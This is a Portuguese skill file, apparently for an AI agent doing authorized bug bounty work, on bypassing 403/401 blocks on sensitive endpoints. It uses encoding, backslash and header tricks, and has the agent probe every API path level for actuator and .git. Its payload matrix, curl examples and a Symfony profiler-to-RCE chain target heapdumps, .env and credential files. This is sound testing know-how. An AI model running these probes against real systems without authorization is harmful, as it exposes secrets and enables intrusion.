---
name: bypass-403-sensitive-files
description: Metodologia de bypass de 403 / 401 / 500 / "acesso negado" em arquivos e endpoints sensíveis, para bug bounty e pentest autorizado. Use SEMPRE que qualquer tentativa de acessar um recurso sensível retornar 403 Forbidden, 401 Unauthorized, 500 ou qualquer forma de acesso negado — e também sempre que o usuário mencionar "403 bypass", "401 bypass", "bypass de WAF", "actuator bloqueado", "heapdump 403", "endpoint interno dá 403", "arquivo sensível bloqueado", ou colar um template nuclei com paths percent-encoded. SONDA ATIVA além do contorno: para CADA rota de API encontrada, e em CADA nível do path dela (subindo até a raiz), anexar /%61ctuator (a primeira letra já codificada — o primeiro decode sempre acontece, então chega como actuator, e de brinde contorna WAFs que casam a string literal) e /%2egit/config; se a sonda retornar 401/403/500, rodar a cadeia de bypass ali (url encode de uma letra, depois double encode, depois barra invertida). Cenário clássico: /actuator aberto listando os endpoints mas /actuator/heapdump e /actuator/env barrados pelo WAF — a lista do actuator diz quais endpoints existem, e um simples \\ contorna o Imperva (/actuator\\heapdump). DEDUPLICAÇÃO OBRIGATÓRIA em registro probed.txt chaveado por (nível de path + recurso + estado autenticado/anônimo): cada combinação é tocada UMA ÚNICA vez em todo o engajamento — prefixos compartilhados por várias rotas de API são sondados uma vez só (não uma vez por rota), e recurso já encontrado, já 404, ou já com a cadeia de bypass esgotada NUNCA é resondado; sondar só /%61ctuator e /%2egit primeiro e escalar o encoding apenas apos bloqueio. A técnica central é que a camada que bloqueia (WAF, location do nginx, ACL de gateway, matcher do Spring Security) compara a STRING CRUA do path, enquanto o backend DECODIFICA o path antes de rotear — então codificar um único caractere quebra a regra de bloqueio sem quebrar o roteamento. Cobre: percent-encoding simples do último caractere (actuato%72) e encoding duplo (actuato%2572) — ambos SEMPRE testados, qualquer um dos dois pode ser o que funciona; exceção da posição: quando o path contém NOME DE ARQUIVO com extensão (app_dev.php, index.php, .env, .git/config) o alvo do encoding é o PONTO (app_dev%2ephp, %2eenv) e não a última letra, porque a regra casa a string literal do arquivo; bypass de proxy reverso com %2f, %5c e %2e nos separadores do path; cadeia Symfony do 403 ao RCE (profiler _profiler/open?file= liberado por %2e no ponto, app_secret obtido via phpinfo exposto, assinatura forjada levando a RCE, e senha de banco vazada em bundle de analytics); diferenciação de baseline com nome errado (getAllUserz -> 404 prova que a regra casa a string exata, não o diretório); bypass por barra invertida (actuator\heapdump e %5c) contra regex de WAF que só conhece "/"; headers customizados obrigatórios da aplicação (Channel, Platform, Environment) que fazem o request passar; matriz completa de payloads; lista de arquivos/endpoints sensíveis onde aplicar; regras de confirmação para zero falso positivo. Muito comum em nginx, Spring Boot Actuator, API gateways e WAFs. Só usar dentro do escopo formalmente autorizado.
---

# Bypass de 403 / 401 em Arquivos e Endpoints Sensíveis

Metodologia para contornar bloqueios de acesso (403, 401, 500, "access denied")
em recursos sensíveis, explorando a **discrepância entre a camada que bloqueia e
a camada que roteia**.

**Pré-condição obrigatória**: só use esta skill dentro do escopo formalmente
autorizado (programa de bug bounty, contrato de pentest). Confirme que o
host está no escopo antes de qualquer teste. A regra de ouro é **somente
leitura** — confirmar que o acesso existe, nunca extrair dados em massa,
nunca executar ação destrutiva.

## 1. Ideia central — por que o bypass funciona

Praticamente todo bloqueio de path em produção é uma **comparação de string**
feita por uma camada que **não decodifica** (ou decodifica menos vezes) do que a
camada que efetivamente roteia a requisição:

```
   [ WAF / nginx location / ACL do gateway / Spring Security matcher ]
                  compara a STRING CRUA do path
                              |
                              v
   [ backend real: Tomcat, Spring Boot, IIS, app ]
                  DECODIFICA o path e então roteia
```

Se você codifica **um único caractere** do path:

- a regra de bloqueio **não casa mais** (a string mudou), então ela deixa passar;
- o backend **decodifica** e chega exatamente no mesmo recurso.

Resultado: o recurso bloqueado responde 200.

Esse é o mesmo princípio da skill `path-normalization-traversal` (discrepância
de interpretação entre camadas), mas aplicado ao **bloqueio de acesso**, não ao
roteamento de diretório. As duas skills se complementam: se a travessia falhar
mas algo der 403, esta skill é o próximo passo — e vice-versa.

## 2. Os dois níveis de encoding — SEMPRE testar os dois

Esta é a regra mais importante da skill. **Nunca teste só um dos dois.**

### 2.1 Encoding simples

Troque um caractere pelo seu percent-encoding. `r` = `%72`, `s` = `%73`,
`e` = `%65`, `t` = `%74`, `a` = `%61`, `o` = `%6f`, `n` = `%6e`, `p` = `%70`.

```
/actuator     ->  /actuato%72
/getAllUsers  ->  /getAllUser%73
```

Funciona quando a camada de bloqueio compara a string crua e o backend decodifica
uma vez.

### 2.2 Encoding duplo

Codifique o próprio `%` (`%25`), de forma que sobre `%72` depois da primeira
decodificação e vire `r` depois da segunda.

```
/actuator     ->  /actuato%2572     (%25 + "72"  ->  %72  ->  r)
/getAllUsers  ->  /getAllUser%2573
```

Funciona quando existem **duas camadas decodificando** (proxy decodifica e
repassa, backend decodifica de novo), ou quando a regra de bloqueio roda
**depois** da primeira decodificação — nesse caso o encoding simples já teria
sido desfeito e bloqueado, mas o duplo ainda está disfarçado naquele ponto.

### 2.3 Regra prática

| Situação | Encoding que passa |
|---|---|
| Bloqueio compara string crua, backend decodifica 1x | simples (`%72`) |
| Bloqueio roda após 1ª decodificação, backend decodifica 2x | duplo (`%2572`) |

Você **não sabe de antemão** qual é o caso. Teste os dois, sempre, em qualquer
recurso que der 403/401. Um dos dois pode dar 200 enquanto o outro continua 403 —
e não há como prever qual.

### 2.4 Qual caractere codificar — APENAS A ÚLTIMA LETRA

**Regra fixa: o encoding é aplicado somente no ÚLTIMO caractere do segmento.**
Não codifique caractere do meio nem o primeiro — não é o padrão que funciona e
só gera requests inúteis. São exatamente **duas** variantes por segmento:
URL encode e double URL encode, ambas na última letra.

```
/actuator     ->  /actuato%72       (URL encode da última letra)
              ->  /actuato%2572     (double URL encode da última letra)

/getAllUsers  ->  /getAllUser%73
              ->  /getAllUser%2573
```

Se a regra bloqueia o **prefixo/diretório** e não o arquivo (ver seção 3),
aplique a mesma dupla na **última letra do prefixo**:

```
/actuator/heapdump  ->  /actuato%72/heapdump
                    ->  /actuato%2572/heapdump
```

### 2.5 Exceção: quando o path tem um NOME DE ARQUIVO conhecido

A regra da última letra vale para nomes de rota (`/actuator`, `/getAllUsers`).
Mas quando o path contém um **arquivo com extensão** — `app_dev.php`,
`index.php`, `.env`, `.git/config` — a regra de bloqueio quase sempre casa a
**string literal do arquivo**. Nesse caso o alvo do encoding é o **ponto**:

```
app_dev.php      ->  app_dev%2ephp        (%2e = ".")
                 ->  app_dev%252ephp
index.php        ->  index%2ephp
.env             ->  %2eenv
.git/config      ->  %2egit/config
```

Continua sendo **um caractere só**, e continuam sendo as duas formas (simples e
duplo). Só muda a posição: o ponto em vez da última letra, porque é ele que
define o nome do arquivo na regra.

Isso é o mesmo raciocínio da seção 3 — codifique o caractere que faz a regra
casar. Em `/actuator` esse caractere é o último; em `app_dev.php` é o ponto.

**Sobre `.env` e a regra de dotfile do nginx:** o `location ~ /\.` do nginx
bloqueia qualquer path que comece com ponto. O nginx decodifica a URI **antes**
do location matching, então `%2eenv` provavelmente ainda casa e continua 403 —
mas `%252eenv` tem chance real: o nginx decodifica uma vez para `%2e`, não casa
mais com a regra, repassa, e o backend decodifica de novo. Se quem bloqueia for
um WAF ou CDN que compara raw, o `%2e` simples também passa. Por isso os dois
vão sempre.

## 3. Diferenciação de baseline — descobrir ONDE está o bloqueio

**Antes de sair codificando, descubra o que exatamente a regra está casando.**
Isso decide onde você aplica o encoding e evita dezenas de requests inúteis.

Peça um recurso com o **nome propositalmente errado** no mesmo diretório:

```
GET /api/internal/getAllUsers   ->  403     (o alvo)
GET /api/internal/getAllUserz   ->  404     (nome errado)
```

Leitura do resultado:

- **403 no certo, 404 no errado** → a regra casa a **string exata**
  `getAllUsers`. O recurso existe e o bloqueio é por nome.
  **Este é o cenário ideal** — codificar um caractere do nome tende a funcionar.
- **403 nos dois** → a regra bloqueia o **diretório/prefixo** inteiro
  (`/api/internal/`). Codificar o nome do arquivo não adianta;
  codifique um caractere do **prefixo**.
- **404 nos dois** → não há bloqueio, o recurso simplesmente não existe.
  Não gaste tempo aqui.

Esse teste de nome errado é barato (1 request) e direciona todo o resto.

## 4. Bypass por barra invertida

WAFs e regras de proxy escritas com regex costumam conhecer apenas `/` como
separador. Backends em Windows/IIS — e várias stacks Java — tratam `\` como
separador equivalente.

```
/actuator/heapdump   ->  /actuator\heapdump
                     ->  /actuator%5cheapdump
                     ->  /actuator%255cheapdump
```

Combine com o encoding da seção 2:

```
/actuato%72\heapdump
/actuato%2572%5cheapdump
```

**Sempre envie com `curl --path-as-is`** — sem essa flag o curl normaliza o path
no cliente e você acaba testando outra coisa.

### 4.1 Bypass de proxy reverso — `%2f`, `%5c`, `%2e`

Quando há um **proxy reverso** na frente (nginx, gateway) e o 403 vem dele, e
não da aplicação, os três separadores codificados são o conjunto a testar:

```
%2f   ->  "/"    o proxy não vê o path que a origem vai montar
%5c   ->  "\"    proxies com regex que só conhecem "/" deixam passar
%2e   ->  "."    quebra o nome de arquivo/rota na string da regra
```

Aplique-os nos separadores do path bloqueado:

```
/app_dev.php/_profiler/open    ->  /app_dev%2ephp/_profiler/open
                               ->  /app_dev.php%2f_profiler/open
                               ->  /app_dev.php%5c_profiler/open
                               ->  /app_dev%252ephp/_profiler/open
```

Como sempre: **um caractere por tentativa**, e as duas formas (simples e duplo).
Use `curl --path-as-is` — sem essa flag o curl normaliza no cliente e você
testa outra coisa.

## 5. Headers customizados da aplicação

Um 403 nem sempre é ACL. Muitas APIs devolvem 403 quando **faltam headers que a
aplicação real sempre envia**. Antes de concluir que há bloqueio de segurança:

1. Capture um request real da aplicação (proxy/DevTools).
2. Replique **todos** os headers, não só `User-Agent` e `Cookie`.
3. Headers que já apareceram como obrigatórios em casos reais:
   `Channel`, `Platform`, `Environment`, `X-Requested-With`, `Referer`,
   `Origin`, headers de tenant/app custom.

Um 403 que vira 200 só por adicionar `Channel`/`Platform`/`Environment` não é
bypass de WAF — é requisito da aplicação. Descubra isso **antes** de reportar,
para não mandar um report errado.

## 6. Matriz completa de payloads

Para cada recurso sensível que der 403/401/500, testar nesta ordem:

```
1.  /recurso                      (baseline)
2.  /recursz                      (nome errado - diferenciação, seção 3)
3.  /recurs%6f                    (URL encode da ÚLTIMA letra)
4.  /recurs%256f                  (double URL encode da ÚLTIMA letra)
5.  /prefix%6f/recurso            (última letra do prefixo, se o bloqueio for de diretório)
6.  /prefix%256f/recurso
7.  /prefixo\recurso              (barra invertida)
8.  /prefixo%5crecurso
9.  /prefixo%255crecurso
10. /arq%2eext                    (ponto do nome de arquivo, se houver — 2.5)
11. /arq%252eext
12. /prefixo%2frecurso            (separador codificado, se houver proxy — 4.1)
13. /recurso  + headers completos da aplicação real (seção 5)
```

Cada um é **um request direto**. Isto é uma skill de detecção dirigida —
**nada de fuzzing/brute-force**, nada de wordlist. São ~13 requests por recurso (10 quando o path não tem nome de arquivo).

## 6.5 Sonda automática de actuator / .git em cada rota de API

Além de contornar 403 em recurso já conhecido, esta skill **descobre** o recurso
sondando ativamente. A regra:

**Para cada rota de API que você encontrar, e em cada nível do path dela, anexe
`/actuator` e `/.git/config`. Se der 401/403/500, rode a cadeia de bypass.**

### 6.5.1 Use a primeira letra já codificada

Sonde com `/%61ctuator`, não `/actuator`:

```
/api/v1/sub/%61ctuator          (%61 = "a")
/api/v1/sub/%2561ctuator        (double encode, se o simples for barrado)
```

**Por quê:** o primeiro nível de URL-decode **sempre** acontece no servidor,
então `%61ctuator` chega como `actuator` de qualquer jeito — você não perde
nada. E de brinde, já contorna alguns WAFs que casam a string literal
`actuator` na requisição crua. É bypass grátis embutido na própria sonda.

O mesmo vale para outros recursos sensíveis:

```
/%2egit/config      (.git/config com o ponto codificado)
/%2eenv             (.env)
```

### 6.5.2 Sonde em CADA nível do path — simples E duplo

Um actuator pode estar montado em qualquer prefixo — não só na raiz. Dado
`/api/v1/sub`, sonde subindo, e em **cada** nível teste as **duas** formas:

```
nível 3:  /api/v1/sub/%61ctuator        (simples)
          /api/v1/sub/%2561ctuator      (duplo)
nível 2:  /api/v1/%61ctuator
          /api/v1/%2561ctuator
nível 1:  /api/%61ctuator
          /api/%2561ctuator
raiz:     /%61ctuator
          /%2561ctuator
```

**Por que os dois desde a sonda, e não só depois do bloqueio:** as duas formas
chegam ao servidor de maneira diferente e batem em camadas diferentes.

- `%61ctuator` → o 1º decode do servidor resolve para `actuator`. Passa por WAF
  que compara a string crua, e a app roteia normal. É o caso de **uma** camada
  de decode.
- `%2561ctuator` → o 1º decode resolve para `%61ctuator`; só um **segundo**
  decode vira `actuator`. É o que abre quando há **duas** camadas (proxy
  decodifica e repassa, app decodifica de novo), ou quando o WAF roda **depois**
  do 1º decode — situação em que o simples já teria sido revertido e barrado, e
  só o duplo continua disfarçado naquele ponto.

Não dá para prever qual camada o alvo tem, então a sonda leva as duas (mesma
lógica da seção 2.3). São 2 requisições por nível — barato, e é o que garante
não perder um actuator que só o duplo alcança.

E os endpoints filhos do actuator, que é onde está o valor:

```
/%61ctuator/env          /%2561ctuator/env
/%61ctuator/heapdump     /%2561ctuator/heapdump
/%61ctuator/health       /%2561ctuator/health
/%61ctuator/mappings     /%2561ctuator/mappings
```

### 6.5.3 Actuator aberto + filho bloqueado = o cenário clássico

O caso mais comum e mais valioso: o `/actuator` **responde** (lista os
endpoints disponíveis), mas ao pedir `/actuator/heapdump` ou `/actuator/env` o
**WAF bloqueia**. Isso é ouro, porque:

1. O `/actuator` **te diz quais endpoints existem** — você não adivinha, lê a
   lista. Se `heapdump` está listado, ele existe; agora é só questão de acessá-lo.
2. O bloqueio é do WAF, não da aplicação → a cadeia de bypass (seções 2, 4,
   4.1) tende a funcionar.

Caso real: actuator aberto, `heapdump`/`env` barrados pelo **Imperva**. Bastou
adicionar um `\` para contornar:

```
/actuator/heapdump          -> 403 (Imperva)
/actuator\heapdump          -> 200 (heapdump de centenas de MB)
```

### 6.5.4 Deduplicação — NUNCA sondar o mesmo nível duas vezes

Como a sonda roda em toda rota de API, sem controle ela repete o mesmo prefixo
dezenas de vezes e gera tráfego inútil. **A dedup é obrigatória, não opcional.**

Mantenha um registro do que já foi sondado, chaveado por **nível de path +
estado de autenticação**:

```
probed.txt:
  /api|anon|actuator
  /api|anon|git
  /api/v1|anon|actuator
  /api/v1/sub|anon|actuator
  /api|auth|actuator
```

Antes de sondar qualquer nível, cheque a lista. Se já está lá, **pule** — não
importa quantas rotas novas passem por aquele prefixo depois.

```bash
sondar() {
  local NIVEL="$1" ESTADO="$2" RECURSO="$3"     # ex: /api/v1  anon  actuator
  local TAG="${NIVEL}|${ESTADO}|${RECURSO}"
  grep -qxF "$TAG" probed.txt && return          # ja sondado -> pula
  echo "$TAG" >> probed.txt
  # ... roda a sonda simples + duplo, e o bypass se bloquear
}
```

**Onde a economia aparece:** navegando por `/api/v1/users`, `/api/v1/orders` e
`/api/v1/products`, o nível `/api/v1` e o `/api` são sondados **uma vez só**. As
três rotas compartilham os prefixos — sem a dedup seriam 3× as mesmas
requisições de actuator e `.git`.

**As regras exatas:**

1. **Mesmo nível + mesmo estado** já sondado → nunca repetir.
2. **Recurso já ENCONTRADO** naquele nível (achou o actuator) → não sondar de
   novo; trabalhe o que achou. Registre `encontrado` para não reprocessar.
3. **Recurso que deu 404** naquele nível → também não repetir; não existe ali.
4. **Autenticado vs. não autenticado são estados diferentes** — um actuator pode
   aparecer só num deles. Sondar cada estado **uma** vez é correto; sondar o
   mesmo estado duas vezes é desperdício.
5. O bypass (simples → duplo → `\`) num recurso bloqueado também entra no
   registro: uma vez esgotada a cadeia naquele recurso, **não recomece** —
   marque como `bypass-esgotado` e siga.

**Regra geral:** cada par (nível, recurso, estado) é tocado **uma única vez** em
todo o engajamento. Se já testou actuator ou `.git` naquele path, nunca mais
teste ali — vale para a sonda e para o bypass.

## 7. Onde aplicar## 7. Onde aplicar — recursos sensíveis

Aplique a matriz a **qualquer** recurso sensível que retorne acesso negado:

**Spring Boot Actuator** (o caso canônico):
`/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/jolokia`,
`/actuator/logfile`, `/actuator/mappings`, `/actuator/loggers`,
`/actuator/configprops`, `/actuator/beans`, `/actuator/threaddump`,
`/env`, `/heapdump`, `/jolokia` (rotas sem prefixo, Boot 1.x)

**Arquivos de configuração/repositório:**
`.git/config`, `.env`, `web.config`, `settings.py`, `application.properties`,
`application.yml`, `appsettings.json`, `README.md`

**Symfony — profiler e front controller de dev** (alto valor, ver 9.4):
`app_dev.php`, `app_dev.php/_profiler`, `app_dev.php/_profiler/open?file=...`,
`_profiler/phpinfo`, `_profiler/latest`, `config.php`, `index.php/_profiler`,
`_fragment`

**Painéis e rotas internas:**
`/admin`, `/manager/html`, `/console`, `/api/internal/*`, `/debug/*`,
`/swagger-ui.html`, `/v2/api-docs`, `/actuator/*` atrás de gateway

## 8. Confirmação — zero falso positivo

Um 200 sozinho **não confirma nada**. Antes de registrar como achado:

1. **O conteúdo bate com o recurso pedido?** Um `/actuator/env` de verdade traz
   JSON com propriedades. Se voltou o `index.html` da SPA, é catch-all, não bypass.
2. **Content-Length é coerente?** Um heapdump é dezenas ou centenas de MB. Um
   200 com 1.2KB no lugar de um heapdump é a página padrão.
3. **Content-Type bate?** `application/json`,
   `application/vnd.spring-boot.actuator.v3+json`, `application/octet-stream`
   para heapdump. `text/html` num endpoint de actuator = falso positivo.
4. **Controle pareado:** aplique o MESMO encoding a um recurso inexistente
   (`/actuatz%6f`). Se ele também der 200, o servidor tem catch-all e o
   resultado não vale nada.
5. **Reproduza.** Refaça o mesmo request e confirme o mesmo resultado.

## 9. Contextos reais que originaram esta skill

### 9.1 Template nuclei — springboot-actuators

O template que expressa a técnica. Note que ele **não** testa `/actuator`
diretamente — testa direto as duas formas codificadas, justamente porque a
forma limpa costuma estar bloqueada:

```yaml
id: springboot-actuators

info:
  name: Detect the exposure of Springboot Actuators
  author: that_juan_ & dwisiswant0
  severity: high
  tags: spring,springboot

http:
  - method: GET
    path:
      - "{{BaseURL}}/actuato%72"
      - "{{BaseURL}}/actuato%2572"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        condition: or
        words:
          - "application/json"
          - "application/vnd.spring-boot.actuator"
          - "application/vnd.spring-boot.actuator.v2+json"
          - "application/vnd.spring-boot.actuator.v3+json"
          - "X-Application-Context"
      - type: word
        part: body
        condition: or
        words:
          - "env"
          - "heapdump"
          - "jolokia"
          - "logfile"
          - "mappings"
          - "loggers"
          - "configprops"
```

A ideia a generalizar: sempre que `/actuator` der 500, 403, 401 ou acesso
negado, tentar `actuato%72` e `actuato%2572`. **E isso vale para qualquer
arquivo sensível que se tente acessar** — não só actuator. Acontece muito em
nginx e em outras stacks também.

### 9.2 Caso real — encoding duplo abrindo endpoint interno

Sequência exata do teste, com a diferenciação de baseline no meio:

```
GET /api/internal/getAllUsers      -> 403
GET /api/internal/getAllUserz      -> 404   -> Conclusão: bloqueio em "getAllUsers"
GET /api/internal/.../getAllUsers  -> 403   (também testadas outras variações de path traversal)
GET /api/internal/getAllUser%73    -> 403
GET /api/internal/getAllUser%2573  -> 200   -> Content-Length: GRANDE
```

Duas lições:

1. O `getAllUserz -> 404` foi o que provou que a regra casava a string exata
   `getAllUsers` — sem esse request você não saberia onde aplicar o encoding.
2. O encoding **simples** (`%73`) continuou 403 e só o **duplo** (`%2573`)
   passou. Mas o inverso também acontece: `getAllUser%73` **poderia** ter dado
   200. Por isso os dois são obrigatórios, sempre.

Note também que path traversal (`/.../`) foi testado e falhou — travessia e
bypass de encoding são bugs diferentes; um não substitui o outro.

### 9.3 Caso real — barra invertida contornando o WAF, heapdump de 400 MB

```
curl "https://site.com/api/v2/analytics/actuator/heapdump"   -> 403
curl "https://site.com/api/v2/analytics/actuator\heapdump"   -> 200 OK
```

**Observações do caso:**

- O uso da barra invertida (`\`) no caminho da URL foi suficiente para
  contornar as regras do WAF.
- O heapdump obtido tem aproximadamente **400 MB**, enquanto o report anterior
  tinha cerca de **48 MB**.
- São necessários os headers customizados (`Channel`, `Platform`,
  `Environment`) para que a requisição seja bem-sucedida.

Lição: o bypass (`\`) e o requisito de headers da aplicação são coisas
**separadas** e precisaram das duas juntas para o 200 sair. Se você testar o `\`
sem os headers, vai concluir erroneamente que o bypass não funciona.

### 9.4 Caso real — Symfony profiler: `%2e` no ponto, `app_secret` e RCE

Cadeia completa, do 403 ao RCE, num alvo Symfony.

**1) Encontrar a rota 403**

```
app_dev.php/_profiler/open?file=config/parameters.yaml&line=1
```

O `_profiler/open` é um leitor de arquivo do profiler do Symfony — se
acessível, lê arquivo arbitrário do projeto. Em produção costuma estar
bloqueado, retornando 403.

**2) Tentar bypass de proxy reverso**

Testados `%2f`, `%5c` e `%2e` nos separadores do path (seção 4.1).

**3) O que funcionou — `%2e` no ponto**

```
app_dev%2ephp/_profiler/open?file=config/parameters.yaml&line=1
```

Codificar o **ponto** de `app_dev.php` quebrou a regra que casava a string
literal `app_dev.php`, e a origem decodificou de volta e serviu o profiler.

**Aumento de impacto 1 — `app_secret` → RCE**

- Descobrir o `app_secret` através do **phpinfo exposto** (o próprio profiler
  costuma expor `_profiler/phpinfo`).
- Com o `app_secret` em mãos, é possível **forjar assinaturas** do Symfony
  (o secret assina URIs de `_fragment`, tokens de "remember me" e payloads
  serializados) e escalar para **RCE**.

**Aumento de impacto 2 — senha do banco via JavaScript**

- Obter a senha do banco de dados pelo **vazamento nos arquivos JavaScript do
  analytics** — build que embutiu configuração de servidor no bundle do front.

**Lições transferíveis:**

- O ponto de um front controller (`app_dev.php`, `index.php`, `config.php`) é
  posição de encoding de primeira classe (seção 2.5), não a última letra.
- Um 403 num leitor de arquivo (`?file=`) vale muito mais do que um 403 comum:
  o bypass entrega leitura arbitrária, não só uma página.
- **Encadeie**: leitura de arquivo → `app_secret` → assinatura forjada → RCE.
  Cada artefato lido é insumo para o próximo passo; não pare no primeiro 200.
- Sempre cruze com a skill `bughunter`: o segredo que fecha a cadeia pode estar
  num bundle de analytics, não no arquivo que você acabou de ler.

## 10. Impacto e report

Um heapdump acessível é **crítico**, não informativo: contém credenciais em
memória, tokens de sessão, connection strings, chaves de API e dados de usuário.
`/actuator/env` expõe variáveis de ambiente e propriedades com segredos.

No report:

1. Mostre o **baseline primeiro** (o 403 na forma limpa) e só depois o request
   que funcionou — a diferença entre os dois É a prova.
2. Inclua o request completo, com todos os headers necessários.
3. Descreva o que o arquivo contém e o tamanho, **sem colar segredos** no corpo
   do report (use `[REDACTED]`).
4. Se headers customizados foram necessários, diga isso explicitamente — o
   triager precisa deles para reproduzir.
5. Seja honesto sobre cobertura: liste o que foi testado e não funcionou.

## 11. Checklist

- [ ] Baseline registrado (a resposta da forma limpa).
- [ ] Teste de nome errado feito, para localizar o bloqueio (seção 3).
- [ ] URL encode E double URL encode testados na ÚLTIMA letra — os dois, sem exceção.
- [ ] Sonda `/%61ctuator` E `/%2561ctuator` (simples e duplo) em CADA nível de CADA rota de API (6.5).
- [ ] Sonda usou a 1ª letra JÁ codificada (`%61ctuator`, `%2egit`) — bypass grátis de WAF.
- [ ] Sonda bloqueou (401/403/500)? Bypass na ordem: URL encode 1 char, DEPOIS double encode, DEPOIS `\`.
- [ ] Actuator aberto? Lista de endpoints lida para saber quais filhos existem (heapdump, env).
- [ ] Registro `probed.txt` mantido: cada (nível, recurso, estado) sondado UMA vez só.
- [ ] Prefixos compartilhados por várias rotas sondados uma vez (não por rota).
- [ ] Recurso já encontrado / já 404 / já com bypass esgotado NÃO é resondado.
- [ ] Path com nome de arquivo (`app_dev.php`, `.env`)? Ponto codificado também (2.5).
- [ ] Proxy reverso na frente? `%2f`, `%5c`, `%2e` testados nos separadores (4.1).
- [ ] Encoding aplicado só na última letra (do arquivo, ou do prefixo se o bloqueio for de diretório) — nunca no meio nem no primeiro caractere.
- [ ] Barra invertida testada (`\`, `%5c`, `%255c`).
- [ ] Headers completos da aplicação replicados (seção 5).
- [ ] `curl --path-as-is` usado em todos os requests.
- [ ] Confirmação feita: conteúdo, Content-Type, Content-Length e controle
      pareado em recurso inexistente.
- [ ] Resultado reproduzido pelo menos duas vezes.
- [ ] Nada de fuzzing/wordlist — apenas os requests dirigidos da matriz.
